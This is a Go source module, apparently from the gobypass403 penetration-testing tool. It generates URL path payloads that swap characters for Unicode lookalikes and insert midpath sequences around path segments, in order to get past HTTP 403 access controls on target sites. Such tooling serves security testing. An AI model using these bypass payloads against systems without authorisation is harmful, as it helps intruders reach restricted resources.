package payload

import (
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// SubstituteWithUnicodeLookalikes replaces standard characters in a payload string
// with their primary Unicode lookalikes, based on the provided character map.
// It avoids replacing characters that are part of a percent-encoded sequence.
func SubstituteWithUnicodeLookalikes(payload string, charMap map[rune]string) string {
	var builder strings.Builder
	builder.Grow(len(payload) * 2) // Pre-allocate, assuming some chars will expand
	runes := []rune(payload)
	i := 0
	for i < len(runes) {
		// Check for percent-encoding pattern (e.g., %2f)
		// Need at least 3 characters remaining: %, hex, hex
		// i+2 < len(runes) ensures we can safely access runes[i+1] and runes[i+2]
		// Edge case: if % is at position len-2 or len-1, this check prevents panic
		if runes[i] == '%' && i+2 < len(runes) {
			// Check if the next two characters are valid hex digits
			// Safe to convert to byte since hex digits are always ASCII
			if isHexDigitASCII(byte(runes[i+1])) && isHexDigitASCII(byte(runes[i+2])) {
				// It's a valid percent-encoded sequence, keep it as is
				builder.WriteRune(runes[i])
				builder.WriteRune(runes[i+1])
				builder.WriteRune(runes[i+2])
				i += 3
				continue
			}
			// If not valid hex, fall through to normal substitution
		}

		// Not a percent-encoded sequence, check for substitution
		if replacement, ok := charMap[runes[i]]; ok {
			builder.WriteString(replacement)
		} else {
			builder.WriteRune(runes[i])
		}
		i++
	}
	return builder.String()
}

/*
GenerateUnicodePathExperimentalPayloads generates payloads by first substituting characters in the
mid_paths list with their Unicode lookalikes and then applying the same generation logic
as the standard `mid_paths` module.

This module ONLY generates payloads where Unicode substitution actually changed the original payload,
ensuring no duplication with the standard `mid_paths` module. If no characters are substituted,
an empty payload list is returned.

Example:
  - If `..;` contains `.` in the Unicode map → generates `․․;` (modified)
  - If `//` has no matching characters in map → skipped (not modified)
*/
func (pg *PayloadGenerator) GenerateUnicodePathExperimentalPayloads(targetURL string, bypassModule string) []BypassPayload {
	// 1. Load the Unicode character map for substitutions.
	unicodeMap, err := ReadUnicodeCharMap()
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read unicode_char_map.json for experimental module: %v", err)
		return []BypassPayload{}
	}

	// Create an efficient lookup map (rune -> primary unicode lookalike)
	charToUnicode := make(map[rune]string)
	for _, entry := range unicodeMap {
		// Validate that entry has at least 2 mappings (first is ASCII, second is Unicode lookalike)
		if len(entry.Char) > 0 && len(entry.Mappings) >= 2 {
			// Convert the character string to runes and use the first rune as the key
			charRunes := []rune(entry.Char)
			if len(charRunes) > 0 {
				// Use the SECOND mapping (index 1) as the primary lookalike
				// The first mapping (index 0) is always the ASCII character itself
				charToUnicode[charRunes[0]] = entry.Mappings[1].Unicode
			}
		}
	}

	// 2. Read the raw midpath payloads from the file.
	rawPayloads, err := ReadPayloadsFromFile("internal_midpaths.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read midpaths payloads for experimental module: %v", err)
		return []BypassPayload{}
	}

	// 3. Create a new list of payloads with Unicode substitutions.
	// ONLY include payloads where Unicode substitution actually changed something.
	// This ensures we don't duplicate mid_paths payloads.
	unicodePayloads := make([]string, 0, len(rawPayloads))
	substitutionCount := 0

	for _, payload := range rawPayloads {
		substituted := SubstituteWithUnicodeLookalikes(payload, charToUnicode)

		// Only include if substitution changed the payload
		if substituted != payload {
			unicodePayloads = append(unicodePayloads, substituted)
			substitutionCount++
		}
	}

	// If no payloads were modified, return empty
	if len(unicodePayloads) == 0 {
		GB403Logger.Debug().BypassModule(bypassModule).Msgf(
			"No Unicode substitutions applied (checked %d payloads, 0 modified)",
			len(rawPayloads),
		)
		return []BypassPayload{}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf(
		"Unicode substitution: %d/%d payloads modified (%.1f%%)",
		substitutionCount, len(rawPayloads), float64(substitutionCount)/float64(len(rawPayloads))*100,
	)

	// 4. Use the existing mid_paths generation logic but with ONLY the modified Unicode payloads.
	// This ensures unicode_path_experimental only generates truly unique variants.
	return pg.generateMidPathsWithCustomPayloads(targetURL, bypassModule, unicodePayloads)
}

// generateMidPathsWithCustomPayloads is a modified version of GenerateMidPathsPayloads that accepts a custom payload list.
func (pg *PayloadGenerator) generateMidPathsWithCustomPayloads(targetURL string, bypassModule string, payloads []string) []BypassPayload {
	var jobs []BypassPayload
	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return jobs
	}

	// Get the path, ensuring it starts with a slash for processing
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Handle query string
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Map to store unique paths (for deduplication)
	uniquePaths := make(map[string]struct{})

	// Helper function to add paths with proper handling of special characters
	addPathWithVariants := func(path string) {
		// Add path as-is
		uniquePaths[path+query] = struct{}{}

		// Add path with encoded special characters if needed
		if strings.ContainsAny(path, "?#") {
			encodedPath := encodeQueryAndFragmentChars(path)
			uniquePaths[encodedPath+query] = struct{}{}
		}
	}

	// Split path into segments for insertion
	hasLeadingSlash := strings.HasPrefix(path, "/")
	pathWithoutLeadingSlash := strings.TrimPrefix(path, "/")
	segments := strings.Split(pathWithoutLeadingSlash, "/")

	// 1. Variants before the entire path
	for _, payload := range payloads {
		// Before path without leading slash: PAYLOAD/a/b
		addPathWithVariants(payload + path)

		// Before path with leading slash: /PAYLOAD/a/b
		addPathWithVariants("/" + payload + path)

		// Special case - preserve double slashes if payload ends with slash: /PAYLOAD//a/b
		if strings.HasSuffix(payload, "/") && hasLeadingSlash {
			addPathWithVariants("/" + payload + path) // This keeps the double slash
		}
	}

	// Skip segment manipulations if path is just "/"
	if path != "/" {
		// 2. Process each segment
		for i, segment := range segments {
			if segment == "" {
				continue // Skip empty segments
			}

			for _, payload := range payloads {
				// Create path prefix up to current segment
				prefix := ""
				if hasLeadingSlash {
					prefix = "/"
				}
				for j := 0; j < i; j++ {
					if segments[j] != "" {
						prefix += segments[j] + "/"
					}
				}

				// Create path suffix after current segment
				suffix := ""
				for j := i + 1; j < len(segments); j++ {
					if segments[j] != "" {
						suffix += "/" + segments[j]
					}
				}

				// Variants at segment:

				// Payload fused with segment start: /PAYLOADsegment/
				segStartFused := prefix + payload + segment + suffix
				addPathWithVariants(segStartFused)
				addPathWithVariants("/" + strings.TrimPrefix(segStartFused, "/"))

				// Payload fused with segment end: /segmentPAYLOAD/
				segEndFused := prefix + segment + payload + suffix
				addPathWithVariants(segEndFused)
				addPathWithVariants("/" + strings.TrimPrefix(segEndFused, "/"))

				// Payload after slash before segment: /segment/PAYLOAD/next
				if i < len(segments)-1 || suffix == "" {
					afterSlash := prefix + segment + "/" + payload + suffix
					addPathWithVariants(afterSlash)
					addPathWithVariants("/" + strings.TrimPrefix(afterSlash, "/"))
				}
			}
		}
	}

	// Convert unique paths to BypassPayload jobs
	for rawURI := range uniquePaths {
		// Skip if it's just the query
		if rawURI == query && query != "" {
			continue
		}

		// DO NOT normalize double slashes - they're important for bypass techniques

		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "GET",
			Scheme:       parsedURL.Scheme,
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			BypassModule: bypassModule,
		}
		job.PayloadToken = GeneratePayloadToken(job)
		jobs = append(jobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s", len(jobs), targetURL)
	return jobs
}
